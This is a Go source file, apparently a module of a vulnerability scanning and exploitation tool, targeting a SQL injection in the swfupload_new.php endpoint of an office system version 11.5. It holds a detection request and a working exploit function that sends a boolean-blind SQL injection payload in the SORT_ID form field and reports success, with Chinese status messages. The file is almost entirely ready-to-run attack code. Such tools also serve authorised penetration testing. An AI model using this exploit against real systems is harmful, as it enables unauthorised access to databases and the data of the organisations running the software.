package vulners

import (
	"strings"

	"github.com/fatih/color"
)

type Td06 struct {
}

func (c *Td06) Scan(targetUrl string) {
	vulnerable, err := Td06scancore(targetUrl)
	if err != nil {
		color.Red("[X]请求异常！")
		return
	}
	if vulnerable {
		color.Green("[Td06] 可能存在v11.5 swfupload_new.php SQL注入，请执行Exp模块进行验证")
	} else {
		color.White("[Td06] 不存在v11.5 swfupload_new.php SQL注入")
	}
}

func (*Td06) Exploit(targetUrl string) {
	runResult, err := Td06runcore(targetUrl)
	if err != nil {
		color.Red("[X]漏洞利用异常！")
		return
	}
	if runResult != "" {
		color.Green(runResult)
	} else {
		color.White("[!]漏洞利用无返回结果")
	}
}

func Td06scancore(targetUrl string) (bool, error) {
	url := "/general/file_folder/swfupload_new.php"
	data := `------------GFioQpMK0vv2
Content-Disposition: form-data; name="ATTACHMENT_ID"

1
------------GFioQpMK0vv2
Content-Disposition: form-data; name="ATTACHMENT_NAME"

1
------------GFioQpMK0vv2
Content-Disposition: form-data; name="FILE_SORT"

2
------------GFioQpMK0vv2
Content-Disposition: form-data; name="SORT_ID"

------------GFioQpMK0vv2--`
	resp, err := baseClient.
		NewRequest().
		SetHeaders(map[string]string{
			"Content-Type": "multipart/form-data; boundary=----------GFioQpMK0vv2",
		}).SetBodyString(data).Post(targetUrl + url)
	if err != nil {
		return false, err
	}
	resContent := resp.String()
	if resp.StatusCode == 200 && strings.Contains(resContent, "insert") {
		return true, nil
	} else {
		return false, nil
	}
}

func Td06runcore(targetUrl string) (string, error) {
	url := "/general/file_folder/swfupload_new.php"
	data := `------------GFioQpMK0vv2
Content-Disposition: form-data; name="ATTACHMENT_ID"

1
------------GFioQpMK0vv2
Content-Disposition: form-data; name="ATTACHMENT_NAME"

1
------------GFioQpMK0vv2
Content-Disposition: form-data; name="FILE_SORT"

2
------------GFioQpMK0vv2
Content-Disposition: form-data; name="SORT_ID"

0 RLIKE (SELECT  (CASE WHEN (1=1) THEN 1 ELSE 0x28 END))
------------GFioQpMK0vv2--`
	resp, err := baseClient.
		NewRequest().
		SetHeaders(map[string]string{
			"Content-Type": "multipart/form-data; boundary=----------GFioQpMK0vv2",
		}).SetBodyString(data).Post(targetUrl + url)
	if err != nil {
		return "", err
	}
	resContent := resp.String()
	if strings.Contains(resContent, "status") {
		return "[Td06] 存在v11.5 swfupload_new.php SQL注入\n类型为布尔盲注\nPayload:\n0 RLIKE (SELECT  (CASE WHEN (1=1) THEN 1 ELSE 0x28 END))", nil
	} else {
		return "", nil
	}
}
